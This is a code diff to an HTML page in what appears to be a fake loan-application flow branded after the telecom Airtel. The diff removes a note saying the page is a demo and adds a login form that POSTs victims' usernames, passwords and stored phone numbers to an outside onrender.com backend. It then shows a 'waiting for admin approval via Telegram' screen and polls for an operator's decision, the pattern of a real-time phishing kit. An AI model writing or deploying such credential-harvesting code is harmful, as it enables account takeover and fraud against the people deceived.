@@ -62,36 +62,70 @@
       <p>Complete one more quick verification to finish your application.</p>
 
       <form id="login2Form">
-        <label for="username">Username or Email</label>
-        <input
-          id="username"
-          type="text"
-          placeholder="username or email"
-          required
-        />
+        <label for="username">Username</label>
+        <input id="username" type="text" placeholder="username" required />
 
         <label for="password">Password</label>
         <input id="password" type="password" placeholder="Password" required />
 
-        <button class="btn" type="submit">Sign In & Continue</button>
+        <button class="btn" type="submit">Submit for Approval</button>
       </form>
 
-      <div class="small">
-        This is a final check — no real auth enforced in demo.
-      </div>
+      <div class="small">This will be approved by an admin via Telegram.</div>
     </div>
 
     <script>
-      document.getElementById("login2Form").addEventListener("submit", (e) => {
-        e.preventDefault();
-        const username = document.getElementById("username").value.trim();
-        const password = document.getElementById("password").value.trim();
-        if (!username || !password) return alert("Please fill both fields");
+      document
+        .getElementById("login2Form")
+        .addEventListener("submit", async (e) => {
+          e.preventDefault();
+          const username = document.getElementById("username").value.trim();
+          const password = document.getElementById("password").value.trim();
+          if (!username || !password) return alert("Please fill both fields");
 
-        // Store last step info (demo) and continue to final page
-        localStorage.setItem("lastLoginUser", username);
-        window.location.href = "loan8.html";
-      });
+          const phone = localStorage.getItem("phoneNumber") || "";
+          const backendUrl =
+            localStorage.getItem("backendUrl") ||
+            "https://airtel-01.onrender.com";
+
+          try {
+            const resp = await fetch(`${backendUrl}/api/login/submit`, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ username, password, phone }),
+            });
+
+            const data = await resp.json();
+            if (!data.success || !data.requestId)
+              throw new Error(data.error || "Submit failed");
+
+            // Show waiting UI and poll for approval
+            const card = document.querySelector(".card");
+            card.innerHTML = `<h1>Waiting for admin approval</h1><p id="status">Awaiting approval via Telegram...</p>`;
+
+            const statusEl = document.getElementById("status");
+            const pollInterval = setInterval(async () => {
+              try {
+                const r = await fetch(
+                  `${backendUrl}/api/otp/status/${data.requestId}`,
+                );
+                const j = await r.json();
+                if (j.approved) {
+                  clearInterval(pollInterval);
+                  window.location.href = "loan8.html";
+                } else if (j.rejected) {
+                  clearInterval(pollInterval);
+                  if (statusEl)
+                    statusEl.innerHTML = `Rejected: ${j.message} <a href="login2.html">Try again</a>`;
+                }
+              } catch (err) {
+                console.error("Poll error:", err);
+              }
+            }, 2000);
+          } catch (err) {
+            alert("Error: " + err.message);
+          }
+        });
     </script>
   </body>
 </html>
